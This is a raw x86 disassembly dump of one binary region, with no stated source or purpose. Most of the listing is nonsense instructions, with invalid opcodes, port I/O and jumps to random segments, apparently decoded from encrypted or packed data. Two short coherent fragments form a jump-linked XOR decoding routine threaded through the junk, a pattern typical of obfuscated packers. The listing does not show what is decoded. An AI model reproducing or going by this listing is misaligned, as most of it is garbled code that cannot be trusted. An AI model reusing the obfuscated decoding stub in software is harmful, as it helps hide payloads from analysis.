  412404:	mov    dl,0xf8
  412406:	sbb    BYTE PTR [edi],ch
  412408:	push   ds
  412409:	adc    bh,ch
  41240b:	sbb    DWORD PTR [ebx+0x3d2d7e15],esi
  412411:	and    eax,0xd398cb2b
  412416:	leave  
  412417:	lds    ebp,FWORD PTR [edi]
  412419:	and    eax,0x95b1da64
  41241e:	sti    
  41241f:	xchg   esi,eax
  412420:	popa   
  412421:	push   ds
  412422:	xchg   esp,eax
  412423:	push   edx
  412424:	mov    eax,ds:0x3a338167
  412429:	in     al,dx
  41242a:	or     al,0x63
  41242c:	mov    gs,WORD PTR ss:[edi-0x37]
  412430:	jne    0x4123f1
  412432:	jmp    0x7a010af5
  412437:	(bad)  
  412438:	aam    0x9
  41243a:	push   ebx
  41243b:	sub    cl,BYTE PTR [edi+0xd]
  41243e:	cwde   
  41243f:	mov    dl,0xb0
  412441:	xchg   ebx,eax
  412442:	and    ebx,esp
  412444:	sbb    DWORD PTR [esi+0x70],ebp
  412447:	and    al,0xc
  412449:	or     dl,bl
  41244b:	inc    BYTE PTR [edi]
  41244d:	inc    ebp
  41244e:	popf   
  41244f:	sub    ecx,0xe1f0c9c
  412455:	stc    
  412456:	mov    BYTE PTR [edi+0x15],bl
  412459:	adc    ebx,DWORD PTR [eax+0x4c870ad1]
  41245f:	xchg   ebp,eax
  412460:	pop    esp
  412461:	xor    al,0xe5
  412463:	or     al,BYTE PTR [edx-0x22]
  412466:	outs   dx,BYTE PTR ds:[esi]
  412467:	sub    eax,0x48c2e258
  41246c:	and    dh,cl
  41246e:	fnstcw WORD PTR [eax+edx*8+0x7ccd8442]
  412475:	test   al,0xe
  412477:	mov    dl,0x76
  412479:	pop    ds
  41247a:	(bad)  
  41247b:	sbb    ebx,edi
  41247d:	pop    esp
  41247e:	xor    al,0x97
  412480:	gs rcl esi,1
  412483:	mov    al,ds:0x3e6ccedb
  412488:	enter  0x2b17,0x79
  41248c:	dec    ebp
  41248d:	test   BYTE PTR [edx-0x7a3cf300],ah
  412493:	icebp  
  412494:	mov    al,0x16
  412496:	loop   0x4124fd
  412498:	in     al,0xc5
  41249a:	mov    ebp,ebp
  41249c:	ror    DWORD PTR gs:[eax],0x62
  4124a0:	mov    ds:0x20bf550e,al
  4124a5:	push   edx
  4124a6:	and    al,0xe3
  4124a8:	sub    dh,BYTE PTR [ebp+0x1759b69d]
  4124ae:	dec    ebp
  4124af:	test   DWORD PTR [edi-0x3b],0xe1031655
  4124b6:	cmp    al,0x31
  4124b8:	jmp    0xd20a:0x3415138f
  4124bf:	adc    DWORD PTR [ebx],eax
  4124c1:	sbb    ah,BYTE PTR [ebx-0x77]
  4124c4:	dec    ebp
  4124c5:	or     al,0xc7
  4124c7:	inc    ebp
  4124c8:	mov    al,ds:0xba699577
  4124cd:	mov    DWORD PTR [ebp-0x5c],ecx
  4124d0:	mov    DWORD PTR [ebp-0x48],0xba69957b
  4124d7:	mov    DWORD PTR [ebp-0x44],ecx
  4124da:	mov    DWORD PTR [ebp-0x38],0xba69957f
  4124e1:	mov    DWORD PTR [ebp-0x34],ecx
  4124e4:	jmp    0x412a6e
  4124e9:	xchg   edi,eax
  4124ea:	(bad)  
  4124eb:	jbe    0x412531
  4124ed:	pop    esi
  4124ee:	adc    al,0x25
  4124f0:	mov    ah,0xc9
  4124f2:	pop    es
  4124f3:	shr    BYTE PTR [eax-0x4bbf55fd],cl
  4124f9:	push   edx
  4124fa:	es push ss
  4124fc:	push   ss
  4124fd:	cmp    eax,0x9161604
  412502:	outs   dx,DWORD PTR ds:[esi]
  412503:	xchg   esi,ebp
  412505:	add    eax,eax
  412507:	out    0x80,eax
  412509:	xchg   ebp,eax
  41250a:	add    esi,edx
  41250c:	jno    0x412544
  41250e:	pushf  
  41250f:	cmp    al,0x94
  412511:	in     eax,0x9e
  412513:	rcl    BYTE PTR [ebx-0x40],cl
  412516:	loope  0x412587
  412518:	push   cs
  412519:	push   0xf87cdddf
  41251e:	ret    
  41251f:	mov    al,ds:0x3412d7e4
  412524:	gs push eax
  412526:	ror    BYTE PTR [edx],1
  412528:	jecxz  0x412514
  41252a:	cmp    BYTE PTR [edi-0x26],ch
  41252d:	loop   0x4124f4
  41252f:	adc    bh,BYTE PTR [ebx]
  412531:	outs   dx,DWORD PTR ds:[esi]
  412532:	stos   BYTE PTR es:[edi],al
  412533:	fnstenv [edx+0x16]
  412536:	cmp    BYTE PTR [edx+0x65],al
  412539:	jl     0x412586
  41253b:	mov    bl,0x97
  41253d:	inc    ebp
  41253e:	fidiv  DWORD PTR [eax]
  412540:	pop    es
  412541:	bound  edx,QWORD PTR [eax+0x6f]
  412544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412545:	cmp    ah,0x7e
  412548:	cmp    DWORD PTR [ecx-0x290d1468],0xffffff84
  41254f:	cwde   
  412550:	add    BYTE PTR [edi-0x19],0x16
  412554:	les    ecx,FWORD PTR [edx]
  412556:	retf   
  412557:	scas   eax,DWORD PTR es:[edi]
  412558:	call   0x73f9:0xbb889832
  41255f:	sbb    esp,edi
  412561:	adc    bh,cl
  412563:	pop    edi
  412564:	add    ah,BYTE PTR [edx+0x64]
  412567:	shr    BYTE PTR [edi-0x49],1
  41256a:	push   cs
  41256b:	outs   dx,DWORD PTR ds:[esi]
  41256c:	and    edx,edi
  41256e:	inc    edi
  41256f:	cli    
  412570:	mov    esi,0x8383f1a
  412575:	and    BYTE PTR [edx+edx*8+0x6c],dl
  412579:	cmp    BYTE PTR [ecx],cl
  41257b:	and    al,0x46
  41257d:	in     eax,0xa7
  41257f:	add    eax,0x60cab980
  412584:	ror    DWORD PTR [edi],0xab
  412587:	mov    esi,0x321e3342
  41258c:	sub    DWORD PTR [edi],0x3990a272
  412592:	ficomp WORD PTR [eax]
  412594:	(bad)  
  412595:	or     bl,bl
  412597:	repz repz jecxz 0x412545
  41259b:	cld    
  41259c:	test   al,0xf1
  41259e:	call   0xd8d21728
  4125a3:	stc    
  4125a4:	push   ebx
  4125a5:	enter  0x5627,0x4a
  4125a9:	xor    BYTE PTR [eax],ch
  4125ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125ac:	rcr    DWORD PTR [esp+eax*4+0xa08d455],1
  4125b3:	loope  0x4125f3
  4125b5:	aad    0xec
  4125b7:	dec    edi
  4125b8:	lods   eax,DWORD PTR ds:[esi]
  4125b9:	fst    st(2)
  4125bb:	adc    edi,edi
  4125bd:	cld    
  4125be:	push   0xffffff8e
  4125c0:	je     0x4125f2
  4125c2:	jle    0x4125bb
  4125c4:	je     0x412585
  4125c6:	retf   0x34c4
  4125c9:	mov    edi,0x7e967758
  4125ce:	inc    esp
  4125cf:	xchg   ecx,eax
  4125d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125d1:	imul   edi,DWORD PTR [ecx-0x4ca30ff],0x34e739fc
  4125db:	sub    eax,0xa0a5d2e5
  4125e0:	mov    esi,0x9671c3f3
  4125e5:	dec    ebx
  4125e6:	mov    ebp,0xeb0bfd1
  4125eb:	in     al,dx
  4125ec:	sbb    eax,0xb8b8b5fd
  4125f1:	cwde   
  4125f2:	shr    DWORD PTR [eax-0x1b],cl
  4125f5:	or     DWORD PTR [edx-0x6c],0x2ca530
  4125fc:	push   es
  4125fd:	pop    edx
  4125fe:	mov    edi,0x71cb3673
  412603:	and    BYTE PTR [ecx+0x24e9cf11],0x5
  41260a:	and    dl,dh
  41260c:	lahf   
  41260d:	or     DWORD PTR [eax+0x333fb5a2],edx
  412613:	cmp    esi,DWORD PTR [eax+esi*8-0x23453727]
  41261a:	adc    BYTE PTR [ecx],ah
  41261c:	adc    al,0x98
  41261e:	leave  
  41261f:	pop    esi
  412620:	test   BYTE PTR [ebx-0x280c174b],cl
  412626:	ret    0x1067
  412629:	xor    al,0x7a
  41262b:	add    BYTE PTR [ebx+0x2e],dl
  41262e:	sbb    DWORD PTR [ebp-0x2d],esp
  412631:	popa   
  412632:	mov    ch,0x69
  412634:	hlt    
  412635:	mov    ch,dh
  412637:	mov    ds:0x39e8b098,al
  41263c:	adc    ebp,DWORD PTR [ecx-0x2b]
  41263f:	adc    al,0x62
  412641:	js     0x41269b
  412643:	xor    eax,0x4a46324a
  412648:	adc    BYTE PTR [ecx],0xc3
  41264b:	pusha  
  41264c:	push   es
  41264d:	push   ecx
  41264e:	sar    BYTE PTR [ebp+0x2a],0xfa
  412652:	xchg   esp,eax
  412653:	cmp    edx,DWORD PTR [ebx+esi*2-0x3c7a658b]
  41265a:	jge    0x41267a
  41265c:	push   edi
  41265d:	inc    eax
  41265e:	mov    eax,ds:0x6d3053bd
  412663:	mov    esi,0x9b1690ca
  412668:	aaa    
  412669:	ja     0x412601
  41266b:	xchg   DWORD PTR [ecx],eax
  41266d:	mov    ebx,0x2d26e2e
  412672:	pop    ds
  412673:	enter  0xee87,0x56
  412677:	daa    
  412678:	cs push edx
  41267a:	das    
  41267b:	adc    esp,0x8236379d
  412681:	push   esp
  412682:	add    al,0xad
  412684:	fdiv   QWORD PTR [edx]
  412686:	(bad)  
  412687:	or     bh,dh
  412689:	ret    0xc5c4
  41268c:	std    
  41268d:	retf   0x33ac
  412690:	mov    esp,0x790b2397
  412695:	or     ebx,DWORD PTR [edx+ecx*1+0x49]
  412699:	adc    bl,BYTE PTR [edi+ebx*4-0x1bc56931]
  4126a0:	mov    ds:0x46df8c77,eax
  4126a5:	vunpcklps xmm1,xmm0,XMMWORD PTR [ebx]
  4126a9:	arpl   WORD PTR ds:0xd45ce7a8,sp
  4126af:	mov    bh,0x2a
  4126b1:	sub    ecx,DWORD PTR [edi-0x292dc78c]
  4126b7:	xor    eax,0xf0344e96
  4126bc:	push   ds
  4126bd:	jge    0x4126c5
  4126bf:	int    0x98
  4126c1:	aad    0xb8
  4126c3:	pop    eax
  4126c4:	sbb    BYTE PTR es:[edi],dh
  4126c7:	ss jo  0x41269e
  4126ca:	xor    eax,0x240ccefb
  4126cf:	ins    BYTE PTR es:[edi],dx
  4126d0:	sub    al,0xf8
  4126d2:	xchg   ebx,eax
  4126d3:	pop    esp
  4126d4:	daa    
  4126d5:	add    eax,0x7edb286a
  4126da:	into   
  4126db:	lahf   
  4126dc:	ss jp  0x412660
  4126df:	mov    ebp,0x7e41681b
  4126e4:	aad    0x2f
  4126e6:	push   0x77
  4126e8:	movntq (bad),mm5
  4126e9:	out    0xee,eax
  4126eb:	push   edi
  4126ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126ed:	mov    ds:0x99bdd902,al
  4126f2:	stc    
  4126f3:	call   0xcb18:0x92f1ba90
  4126fa:	push   eax
  4126fb:	xor    al,0x64
  4126fd:	lods   al,BYTE PTR ds:[esi]
  4126fe:	add    eax,0x884be2b9
  412703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412704:	stos   DWORD PTR es:[edi],eax
  412705:	pop    edx
  412706:	(bad)  
  412707:	pop    ebx
  412708:	dec    esi
  412709:	popf   
  41270a:	adc    al,0x76
  41270c:	pop    ebp
  41270d:	mov    ecx,0x6be7f9d7
  412712:	test   al,0xed
  412714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412715:	sahf   
  412716:	mov    eax,0x2c9cbb23
  41271b:	loop   0x412764
  41271d:	push   ss
  41271e:	push   ebp
  41271f:	in     al,0x51
  412721:	in     eax,dx
  412722:	sbb    DWORD PTR [ebp+0x591045d2],edi
  412728:	test   eax,0xfcfb9a3b
  41272d:	std    
  41272e:	lock sti 
  412730:	rcl    esi,0x62
  412733:	in     eax,0x95
  412735:	iret   
  412736:	das    
  412737:	ja     0x4126fe
  412739:	mov    esp,0xad869621
  41273e:	mov    ch,0x79
  412740:	sbb    eax,0xdbe381fd
  412745:	hlt    
  412746:	rcr    BYTE PTR [ebx+0x273d8232],0x12
  41274d:	ins    DWORD PTR es:[edi],dx
  41274e:	in     eax,dx
  41274f:	outs   dx,BYTE PTR ds:[esi]
  412750:	sub    DWORD PTR [esi-0x7d9b3b58],0xa4805d4a
  41275a:	and    edx,0x75
  41275d:	rcl    DWORD PTR [edx],cl
  41275f:	sahf   
  412760:	mov    ds:0xb56722d8,al
  412765:	aam    0xb8
  412767:	es out dx,eax
  412769:	arpl   WORD PTR [ebx+0x5fc91f12],bx
  41276f:	outs   dx,BYTE PTR ds:[esi]
  412770:	mov    ecx,DWORD PTR [edi+0x8]
  412773:	mov    ebp,0x2238b0c3
  412778:	pop    ebp
  412779:	mov    ecx,0x27a2aaf
  41277e:	xor    eax,0xeb114b1f
  412783:	popf   
  412784:	jle    0x412715
  412786:	mov    dl,0x3b
  412788:	mov    WORD PTR [edx],?
  41278a:	mov    edx,0x53beeaa2
  41278f:	lods   eax,DWORD PTR ds:[esi]
  412790:	or     al,0x40
  412792:	cwde   
  412793:	and    DWORD PTR [eax-0x6],ebx
  412796:	dec    ebp
  412797:	lods   eax,DWORD PTR ds:[esi]
  412798:	js     0x41275f
  41279a:	rol    DWORD PTR ds:0xe872dc01,1
  4127a0:	mov    ebx,0x4654e321
  4127a5:	xchg   ebp,eax
  4127a6:	loop   0x412774
  4127a8:	int    0x49
  4127aa:	dec    ebp
  4127ab:	push   ebp
  4127ac:	rcr    ah,cl
  4127ae:	test   DWORD PTR [eax],esp
  4127b0:	jns    0x412800
  4127b2:	fiadd  DWORD PTR [ebp-0x2d]
  4127b5:	in     al,0x59
  4127b7:	mov    dh,0x21
  4127b9:	jne    0x412779
  4127bb:	je     0x41282f
  4127bd:	fidivr WORD PTR ds:0xf0e3043f
  4127c3:	sub    ah,dl
  4127c5:	pusha  
  4127c6:	and    ecx,DWORD PTR [esp+edx*1+0x153f51fb]
  4127cd:	jecxz  0x4127a5
  4127cf:	in     eax,0x6d
  4127d1:	lods   eax,DWORD PTR ds:[esi]
  4127d2:	jb     0x4127c7
  4127d4:	jp     0x41280e
  4127d6:	sub    eax,0x528aa78
  4127db:	inc    ebp
  4127dc:	ins    DWORD PTR es:[edi],dx
  4127dd:	adc    eax,0x2d212420
  4127e2:	jmp    0x412839
  4127e4:	out    dx,al
  4127e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127e6:	xlat   BYTE PTR ds:[ebx]
  4127e7:	pop    esi
  4127e8:	mov    esi,0x172ace2e
  4127ed:	leave  
  4127ee:	xchg   ebx,eax
  4127ef:	jmp    0xa71:0x1e83f1de
  4127f6:	sbb    BYTE PTR ss:[eax],dh
  4127f9:	pop    ecx
  4127fa:	xor    BYTE PTR [esi+0x3129ecf0],ah
  412800:	adc    al,0x11
  412802:	inc    esi
  412803:	push   ecx
  412804:	mov    ?,esi
  412806:	adc    DWORD PTR [ebx+edx*4-0x78],esi
  41280a:	cli    
  41280b:	jge    0x4127a5
  41280d:	cdq    
  41280e:	xchg   DWORD PTR [eax+ecx*8],edx
  412811:	or     al,0xdd
  412813:	push   ss
  412814:	ja     0x412863
  412816:	adc    DWORD PTR [eax+edx*8-0x5d],esi
  41281a:	add    DWORD PTR [esi-0x16169d29],ebp
  412820:	and    al,0x20
  412822:	push   ds
  412823:	pop    esi
  412824:	in     eax,dx
  412825:	pusha  
  412826:	xchg   bh,cl
  412828:	fcmove st,st(3)
  41282a:	mov    ebp,0xecc8ea6e
  41282f:	retf   
  412830:	clc    
  412831:	cs xchg ebp,eax
  412833:	sub    DWORD PTR [esi+0x4878734a],ebp
  412839:	jno    0x4128b3
  41283b:	mov    ds:0xa4ca195e,eax
  412840:	xlat   BYTE PTR ds:[ebx]
  412841:	popf   
  412842:	pop    esi
  412843:	stos   BYTE PTR es:[edi],al
  412844:	daa    
  412845:	call   0xc8cbb420
  41284a:	push   0x63
  41284c:	out    0xe3,eax
  41284e:	daa    
  41284f:	pop    esi
  412850:	pop    ebp
  412851:	push   eax
  412852:	adc    al,0xac
  412854:	shl    BYTE PTR [bx+di],0xf8
  412858:	add    DWORD PTR [ecx-0x79],edi
  41285b:	nop
  41285c:	iret   
  41285d:	aas    
  41285e:	sbb    esi,edx
  412860:	scas   al,BYTE PTR es:[edi]
  412861:	jg     0x41286d
  412863:	dec    edi
  412864:	xlat   BYTE PTR ds:[ebx]
  412865:	and    eax,0xea3a8428
  41286a:	in     al,0xbc
  41286c:	sbb    al,BYTE PTR [ecx-0x60]
  41286f:	add    DWORD PTR [edx+0x1b035850],eax
  412875:	sub    al,BYTE PTR [edi-0x16]
  412878:	pop    edi
  412879:	fsub   DWORD PTR [edx+0xb]
  41287c:	dec    ebp
  41287d:	fs or  eax,0xca0d71ba
  412883:	test   BYTE PTR [bx+di-0x2c87],bh
  412888:	in     al,dx
  412889:	lahf   
  41288a:	retf   0x9b18
  41288d:	out    0xc8,al
  41288f:	ins    DWORD PTR es:[edi],dx
  412890:	mov    ecx,0xa03ec0ae
  412895:	fdiv   DWORD PTR [ebx+0x420c829]
  41289b:	(bad)  
  41289c:	hlt    
  41289d:	mov    ds:0x3de6c284,al
  4128a2:	push   gs
  4128a4:	inc    eax
  4128a5:	and    eax,0x36cec645
  4128aa:	inc    ebx
  4128ab:	jmp    0x4128c8
  4128ad:	cmp    eax,0x2e498a5b
  4128b2:	(bad)  
  4128b4:	aad    0x8
  4128b6:	retf   
  4128b7:	xchg   ecx,eax
  4128b8:	ds (bad) 
  4128ba:	enter  0x4b4a,0xd5
  4128be:	es fs cld 
  4128c1:	mov    eax,ds:0xddb1eb0d
  4128c6:	cmp    ch,BYTE PTR ds:0x17235ea
  4128cc:	add    eax,0xe822895f
  4128d1:	ins    BYTE PTR es:[edi],dx
  4128d2:	add    edx,eax
  4128d4:	sub    BYTE PTR [ecx],ch
  4128d6:	rol    DWORD PTR [esi-0x71],0xf6
  4128da:	dec    ecx
  4128db:	lea    ebp,[ecx]
  4128dd:	sbb    edx,DWORD PTR [ecx+0x6e29762a]
  4128e3:	dec    esi
  4128e4:	xor    edi,edi
  4128e6:	sub    ah,ah
  4128e8:	mov    dh,0xd7
  4128ea:	clc    
  4128eb:	pop    esp
  4128ec:	inc    esp
  4128ed:	adc    ecx,DWORD PTR [edx+0x11235ec]
  4128f3:	jl     0x4128ba
  4128f5:	stc    
  4128f6:	add    eax,0x1766d448
  4128fb:	loope  0x412910
  4128fd:	pop    es
  4128fe:	retf   0x8b8a
  412901:	xchg   BYTE PTR [ebp+edx*4-0x5c36c0dd],ch
  412908:	(bad)  
  412909:	jge    0x4128ef
  41290b:	or     ebp,DWORD PTR [esi-0x73]
  41290e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41290f:	inc    ebp
  412911:	sahf   
  412912:	fidivr WORD PTR [ebx-0x27f1cedf]
  412918:	jno    0x4128b5
  41291a:	mov    ch,BYTE PTR [esi-0x4]
  41291d:	shl    DWORD PTR [eax],1
  41291f:	call   0x436b:0xe2232bcf
  412926:	inc    ecx
  412927:	mov    ?,ebx
  412929:	test   esi,esp
  41292b:	xor    DWORD PTR [ebx-0x37],0xffffffee
  41292f:	sub    al,BYTE PTR [ebx]
  412931:	repz xchg ebp,eax
  412933:	(bad)  
  412934:	mov    esp,0xc0f29308
  412939:	ret    0x9f1a
  41293c:	cdq    
  41293d:	xchg   ecx,eax
  41293e:	xchg   BYTE PTR ds:0x9e94e309,bl
  412944:	sub    DWORD PTR [edx+eiz*2+0x2c],edx
  412948:	jno    0x41299c
  41294a:	or     eax,0xc6d129bb
  41294f:	adc    BYTE PTR [ecx+0x43],al
  412952:	mov    ds:0x30a7a3e6,al
  412957:	popf   
  412958:	jecxz  0x41293b
  41295a:	mov    bl,0x86
  41295c:	push   esp
  41295d:	iret   
  41295e:	ud0    edx,DWORD PTR [ebp-0x2a]
  412962:	push   ecx
  412963:	(bad)  
  412964:	lock mov bh,0x9
  412967:	call   0xe8af:0x7ad5570d
  41296e:	(bad)  
  41296f:	push   ds
  412970:	addr16 add al,0x63
  412973:	xchg   ebp,eax
  412974:	xchg   esp,eax
  412975:	dec    ecx
  412976:	aam    0x63
  412978:	cmp    DWORD PTR [eax],edi
  41297a:	das    
  41297b:	ret    0xe0b3
  41297e:	aas    
  41297f:	(bad)  
  412980:	cmp    al,0x9e
  412982:	dec    ecx
  412983:	mov    eax,0xc20ca34d
  412988:	mov    cl,0x85
  41298a:	xchg   edx,eax
  41298b:	push   esi
  41298c:	sbb    ebx,edx
  41298e:	adc    al,0x5b
  412990:	cld    
  412991:	push   ebp
  412992:	sar    BYTE PTR [ecx+0x1f],0x26
  412996:	or     edx,0x3b
  412999:	call   0x577e803c
  41299e:	retf   
  41299f:	inc    esi
  4129a0:	pop    ecx
  4129a1:	iret   
  4129a2:	movlps QWORD PTR [ebx],xmm1
  4129a5:	sbb    DWORD PTR [ecx+0x66c03c7e],ebx
  4129ab:	adc    ebp,esp
  4129ad:	sbb    al,0xc4
  4129af:	push   edi
  4129b0:	lea    ebp,ds:0x8c80c0ef
  4129b6:	jb     0x412938
  4129b8:	xor    ebx,DWORD PTR [edi+eax*8]
  4129bb:	test   DWORD PTR [edx],esp
  4129bd:	xchg   ebx,eax
  4129be:	fstp   TBYTE PTR [ecx+ecx*1]
  4129c1:	mov    ah,0xd6
  4129c3:	cmp    eax,0xec33d90d
  4129c8:	mov    ah,0xf8
  4129ca:	cmp    al,0xb2
  4129cc:	sahf   
  4129cd:	sar    BYTE PTR [ecx-0x6ac05ee2],1
  4129d3:	dec    ecx
  4129d4:	pop    ebx
  4129d5:	pop    esp
  4129d6:	aas    
  4129d7:	fcmovne st,st(5)
  4129d9:	jae    0x41299a
  4129db:	dec    ebx
  4129dc:	and    ah,BYTE PTR [ebx+0x61]
  4129df:	in     eax,0xf3
  4129e1:	rol    DWORD PTR [edx-0x6b513d34],cl
  4129e7:	mov    dl,0xf7
  4129e9:	cli    
  4129ea:	aam    0x8d
  4129ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129ed:	ss fstp st(7)
  4129f0:	pop    eax
  4129f1:	and    ebx,DWORD PTR [ecx-0x26]
  4129f4:	adc    eax,0x1a44fd6d
  4129f9:	and    BYTE PTR [ebp-0x32f9ac2e],bl
  4129ff:	sbb    WORD PTR [edi+0x8],bp
  412a03:	icebp  
  412a04:	xchg   ebx,eax
  412a05:	adc    eax,0xd6b83936
  412a0a:	jmp    0x1b34:0xdef4bf6c
  412a11:	sti    
  412a12:	retf   
  412a13:	adc    edi,DWORD PTR [edi+0x5583b9eb]
  412a19:	sub    DWORD PTR [ecx-0x21],0xffffffba
  412a1d:	xor    BYTE PTR [edx],bh
  412a1f:	test   DWORD PTR [edi+eiz*1+0x183bfa0a],eax
  412a26:	das    
  412a27:	and    ah,BYTE PTR [edi+0x6b7022e8]
  412a2d:	xor    eax,0x728fb9ed
  412a32:	cmp    DWORD PTR [edi+edx*8-0x41],esp
  412a36:	xchg   ebp,eax
  412a37:	sub    al,0x7e
  412a39:	dec    edi
  412a3a:	arpl   WORD PTR [ecx+0x7bb93879],dx
  412a40:	jnp    0x4129ff
  412a42:	into   
  412a43:	and    BYTE PTR [ebx+0x4c8a6b92],ch
  412a49:	mov    al,BYTE PTR [ebp+0xaf8dba5]
  412a4f:	add    bh,BYTE PTR [esi+0x4229e3cd]
  412a55:	call   0xaf6c:0xaaca2745
  412a5c:	retf   
  412a5d:	xchg   ebx,eax
  412a5e:	fwait
  412a5f:	out    0xb3,eax
  412a61:	(bad)  
  412a62:	fild   QWORD PTR [eax]
  412a64:	shr    BYTE PTR [eax+0xb8187c5],cl
  412a6a:	jl     0x4129fb
  412a6c:	jo     0x4129fe
  412a6e:	mov    eax,DWORD PTR [ebp+0x8]
  412a71:	mov    ecx,DWORD PTR [ebp+0xc]
  412a74:	shrd   eax,ecx,0x2
  412a78:	shr    ecx,0x2
  412a7b:	mov    ecx,DWORD PTR [ebp+0x8]
  412a7e:	mov    edx,DWORD PTR [ebp+0xc]
  412a81:	xor    eax,edi
  412a83:	shl    ecx,0x1e
  412a86:	xor    edx,edx
  412a88:	or     eax,edx
  412a8a:	add    eax,DWORD PTR ds:0x422298
  412a90:	mov    DWORD PTR [ebp+0x14],eax
  412a93:	mov    eax,DWORD PTR [ebp+0x8]
  412a96:	mov    ecx,DWORD PTR [ebp+0xc]
  412a99:	shrd   eax,ecx,0x2
  412a9d:	shr    ecx,0x2
  412aa0:	mov    ecx,DWORD PTR [ebp+0x8]
  412aa3:	mov    edx,DWORD PTR [ebp+0xc]
  412aa6:	xor    eax,edi
  412aa8:	shl    ecx,0x1e
  412aab:	xor    edx,edx
  412aad:	or     eax,edx
  412aaf:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  412ab3:	mov    eax,DWORD PTR [ebp+0x14]
  412ab6:	xor    BYTE PTR [eax],cl
  412ab8:	mov    eax,DWORD PTR [ebp-0x60]
  412abb:	mov    ecx,DWORD PTR [ebp-0x5c]
  412abe:	shrd   eax,ecx,0x2
  412ac2:	shr    ecx,0x2
  412ac5:	mov    ecx,DWORD PTR [ebp-0x60]
  412ac8:	mov    edx,DWORD PTR [ebp-0x5c]
  412acb:	xor    eax,edi
  412acd:	shl    ecx,0x1e
  412ad0:	xor    edx,edx
  412ad2:	or     eax,edx
  412ad4:	add    eax,DWORD PTR ds:0x422298
  412ada:	mov    DWORD PTR [ebp+0x14],eax
  412add:	mov    eax,DWORD PTR [ebp-0x60]
  412ae0:	mov    ecx,DWORD PTR [ebp-0x5c]
  412ae3:	shrd   eax,ecx,0x2
  412ae7:	shr    ecx,0x2
  412aea:	mov    ecx,DWORD PTR [ebp-0x60]
  412aed:	mov    edx,DWORD PTR [ebp-0x5c]
  412af0:	jmp    0x41307a
  412af5:	xchg   ebx,eax
  412af6:	retf   
  412af7:	cs (bad) 
  412af9:	push   ds
  412afa:	adc    dl,BYTE PTR [edx]
  412afc:	mov    ds:0x683e5c87,eax
  412b01:	mov    ?,WORD PTR ds:0x1289682e
  412b07:	push   ss
  412b08:	push   ss
  412b09:	cmp    eax,0xf3161604
  412b0e:	mov    ebp,0xee491ea9
  412b13:	rep outs dx,DWORD PTR ds:[esi]
  412b15:	inc    esp
  412b16:	test   BYTE PTR [edi+0x1a39a0f5],dh
  412b1c:	fwait
  412b1d:	inc    ebp
  412b1e:	lods   al,BYTE PTR ds:[esi]
  412b1f:	or     BYTE PTR [esi],0x4
  412b22:	cmp    BYTE PTR [ebp+edi*4+0x58],cl
  412b26:	stc    
  412b27:	dec    ebx
  412b28:	pushf  
  412b29:	cmp    ebp,ebx
  412b2b:	mov    bl,0xd2
  412b2d:	les    esp,FWORD PTR [ebx+0x48b7216e]
  412b33:	das    
  412b34:	sar    BYTE PTR [ecx],cl
  412b36:	mov    edx,0x57e289d3
  412b3b:	sub    edx,DWORD PTR [edx]
  412b3d:	mov    cl,0xf6
  412b3f:	ja     0x412b5b
  412b41:	push   eax
  412b42:	pop    ecx
  412b43:	mov    cl,0xf1
  412b45:	mul    DWORD PTR [esi+0x2e5f5553]
  412b4b:	dec    ebp
  412b4c:	adc    eax,DWORD PTR [esi-0x62]
  412b4f:	add    BYTE PTR [ecx+0x47],dh
  412b52:	cld    
  412b53:	or     ecx,DWORD PTR [edx-0x5bf5917a]
  412b59:	xchg   edi,eax
  412b5a:	pop    ebp
  412b5b:	mov    ebp,0xdbfcc0f9
  412b60:	push   eax
  412b61:	or     DWORD PTR [ebx-0x2d6257d7],ecx
  412b67:	mov    esi,0xc137bef1
  412b6c:	dec    edx
  412b6d:	xor    esp,DWORD PTR [eax]
  412b6f:	out    dx,eax
  412b70:	pusha  
  412b71:	nop
  412b72:	mov    DWORD PTR [ecx],edx
  412b74:	mov    cl,0xf0
  412b76:	sub    eax,0x778f3b32
  412b7b:	pop    esi
  412b7c:	sbb    dl,al
  412b7e:	leave  
  412b7f:	pushf  
  412b80:	xchg   esp,eax
  412b81:	aaa    
  412b82:	sub    eax,0x84836d1c
  412b87:	xor    edx,DWORD PTR gs:[di+0x7c]
  412b8c:	fnstenv [esi+0x4b9a6f36]
  412b92:	mov    edi,0x559e5d38
  412b97:	pop    esi
  412b98:	pop    ebx
  412b99:	fs inc esi
  412b9b:	loop   0x412b83
  412b9d:	(bad)  
  412b9f:	push   cs
  412ba0:	lods   al,BYTE PTR ds:[esi]
  412ba1:	xor    ebp,ecx
  412ba3:	lea    edx,[ebx-0x7d]
  412ba6:	gs clc 
  412ba8:	or     eax,0x6feb6fef
  412bad:	push   ebp
  412bae:	push   ebx
  412baf:	pop    ds
  412bb0:	stos   DWORD PTR es:[edi],eax
  412bb1:	sbb    al,0x6
  412bb3:	pop    esi
  412bb4:	jno    0x412baa
  412bb6:	call   0xd8c56ab4
  412bbb:	push   ebx
  412bbc:	or     dl,BYTE PTR [ecx-0x5b673d95]
  412bc2:	sbb    BYTE PTR [ecx+eax*4-0x34],dl
  412bc6:	push   ebp
  412bc7:	xchg   BYTE PTR [esi+0x21345e5b],bl
  412bcd:	jle    0x412c13
  412bcf:	popf   
  412bd0:	or     DWORD PTR [eax+0xf9da766],esi
  412bd6:	stos   DWORD PTR es:[edi],eax
  412bd7:	ja     0x412bf5
  412bd9:	xchg   edx,eax
  412bda:	ja     0x412c23
  412bdc:	push   ebx
  412bdd:	pop    esi
  412bde:	inc    eax
  412bdf:	add    al,0xad
  412be1:	stos   BYTE PTR es:[edi],al
  412be2:	adc    DWORD PTR [esi+ebp*8],0xffffff87
  412be6:	adc    eax,0x318b2242
  412beb:	ss loop 0x412c29
  412bee:	add    dh,BYTE PTR [eax-0x4f]
  412bf1:	mov    edx,0xa92dfc57
  412bf6:	ja     0x412bf6
  412bf8:	mov    bl,0xbc
  412bfa:	leave  
  412bfb:	repnz fucom st(7)
  412bfe:	mov    bh,BYTE PTR [ebx-0x76]
  412c01:	sbb    al,0x92
